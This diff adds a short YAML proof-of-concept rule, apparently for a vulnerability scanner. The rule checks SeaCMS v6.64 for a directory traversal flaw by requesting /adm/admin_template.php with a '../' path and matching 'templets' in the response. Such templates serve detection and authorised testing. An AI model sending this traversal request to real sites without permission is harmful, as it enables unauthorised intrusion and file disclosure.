@@ -1,0 +1,10 @@
+name: poc-yaml-seacms-v664-dir
+rules:
+  - method: GET
+    path: /adm/admin_template.php?path=../templets/../../
+    expression: |
+      response.body.bcontains(b'templets')
+detail:
+  author: Facker007(https://github.com/Facker007)
+  links:
+    - https://blog.51cto.com/13770310/2177212
